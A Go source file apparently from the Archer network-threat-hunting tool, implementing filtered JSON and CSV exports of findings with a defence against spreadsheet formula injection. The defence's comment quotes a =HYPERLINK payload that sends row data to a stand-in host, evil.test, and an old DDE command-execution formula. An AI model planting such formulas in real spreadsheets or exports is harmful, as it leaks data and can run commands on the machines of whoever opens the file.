package server

import (
	"encoding/csv"
	"encoding/json"
	"fmt"
	"net/http"
	"strconv"
	"time"

	"github.com/BushidoCyb3r/Archer/internal/version"
)

// Exports honor the same query-string filters as /api/findings. Passing no
// parameters exports everything (original behavior); passing filters produces
// a file that matches exactly what the analyst sees on screen.
func (s *Server) handleExportJSON(w http.ResponseWriter, r *http.Request) {
	findings, err := s.filterFindings(s.store.GetFindings(), r.URL.Query(), newBoundaryFromCtx(r))
	if err != nil {
		http.Error(w, "invalid query: "+err.Error(), http.StatusBadRequest)
		return
	}

	// Strip the per-finding chart data — it's only useful for the in-UI
	// beacon chart, and including it bloats exports by 10-20×. Findings
	// are already a slice of value copies returned by filterFindings, so
	// mutating them here doesn't affect the live store.
	for i := range findings {
		findings[i].TSData = nil
		findings[i].Intervals = nil
	}

	w.Header().Set("Content-Type", "application/json")
	w.Header().Set("Content-Disposition", fmt.Sprintf(`attachment; filename="archer_results_%s.json"`, time.Now().Format("20060102_150405")))

	out := map[string]any{
		"archer_version": version.Version,
		"saved_at":       time.Now().UTC().Format("2006-01-02 15:04:05 UTC"),
		"findings":       findings,
	}
	// Allowlist + IOC list are only useful for /api/import round-trips
	// (config restore from a backup). Default exports are scoped to the
	// findings analysts care about; pass ?include_lists=true to opt in.
	if r.URL.Query().Get("include_lists") == "true" {
		out["allowlist"] = s.store.GetAllowlist()
		out["ioc_list"] = s.store.GetIOCList()
	}

	enc := json.NewEncoder(w)
	enc.SetIndent("", "  ")
	enc.Encode(out)
}

func (s *Server) handleExportCSV(w http.ResponseWriter, r *http.Request) {
	findings, err := s.filterFindings(s.store.GetFindings(), r.URL.Query(), newBoundaryFromCtx(r))
	if err != nil {
		http.Error(w, "invalid query: "+err.Error(), http.StatusBadRequest)
		return
	}
	w.Header().Set("Content-Type", "text/csv")
	w.Header().Set("Content-Disposition", fmt.Sprintf(`attachment; filename="archer_%s.csv"`, time.Now().Format("20060102_150405")))
	cw := csv.NewWriter(w)
	base := []string{"score", "severity", "type", "src_ip", "dst_ip", "dst_port", "timestamp", "detail", "source_file", "sensor", "status", "analyst", "analyst_note"}
	// Beacon-scoped export (type=beacons) appends the triage columns an
	// IR team needs downstream. APPENDED, never inserted: a consumer
	// reading the default 13 columns by index is unaffected, so widening
	// stays non-breaking.
	beaconCols := r.URL.Query().Get("type") == "beacons"
	if beaconCols {
		_ = cw.Write(append(append([]string{}, base...),
			"ts_score", "ds_score", "hist_score", "dur_score",
			"mean_interval", "median_interval", "jitter", "sample_size", "ja3", "ja4"))
	} else {
		_ = cw.Write(base)
	}
	ff := func(v float64) string { return strconv.FormatFloat(v, 'f', -1, 64) }
	for _, f := range findings {
		row := []string{
			strconv.Itoa(f.Score), string(f.Severity), spreadsheetSafe(f.Type),
			spreadsheetSafe(f.SrcIP), spreadsheetSafe(f.DstIP), spreadsheetSafe(f.DstPort),
			spreadsheetSafe(f.Timestamp), spreadsheetSafe(f.Detail),
			spreadsheetSafe(f.SourceFile), spreadsheetSafe(f.Sensor),
			string(f.Status), spreadsheetSafe(f.Analyst), spreadsheetSafe(f.AnalystNote),
		}
		if beaconCols {
			row = append(row,
				ff(f.TSScore), ff(f.DSScore), ff(f.HistScore), ff(f.DurScore),
				ff(f.MeanInterval), ff(f.MedianInterval), ff(f.Jitter), strconv.Itoa(f.SampleSize),
				spreadsheetSafe(f.JA3), spreadsheetSafe(f.JA4))
		}
		_ = cw.Write(row)
	}
	cw.Flush()
}

// spreadsheetSafe defuses CSV / XLSX formula injection: spreadsheet
// applications interpret a cell whose first non-whitespace character is
// =, +, -, @, \t, or \r as a formula. A finding's Detail or AnalystNote
// can plausibly start with one of those — operator-typed notes most
// directly, but Zeek-supplied filenames and URI fragments can too. Real
// world payload: an analyst writes
//
//	=HYPERLINK("https://evil.test/x?d="&A1, "Click")
//
// and the admin opening the export hovers/clicks → row data exfiltrates
// to evil.test. Older Excel had =cmd|'/c calc'!A1 as a DDE-RCE; mostly
// killed by recent Office security defaults but not gone. The OWASP
// mitigation is to prefix the dangerous character with a single quote,
// which Excel/Sheets/LibreOffice treat as a "this is text" hint that
// doesn't survive into the rendered cell. Audit 2026-05-10 NEW-17.
func spreadsheetSafe(v string) string {
	if v == "" {
		return v
	}
	// A leading control char (tab/CR/LF) is dangerous on its own — some
	// importers strip or mishandle it. Otherwise skip leading whitespace,
	// since spreadsheet apps trim it before deciding whether a cell is a
	// formula, then test the first significant character. Checking only
	// v[0] let " =cmd|..." (leading space) bypass the defense. Audit
	// 2026-05-10 NEW-17; leading-whitespace bypass closed 2026-06-06 (L-1).
	switch v[0] {
	case '\t', '\r', '\n':
		return "'" + v
	}
	i := 0
	for i < len(v) && (v[i] == ' ' || v[i] == '\t' || v[i] == '\r' || v[i] == '\n') {
		i++
	}
	if i < len(v) {
		switch v[i] {
		case '=', '+', '-', '@':
			return "'" + v
		}
	}
	return v
}
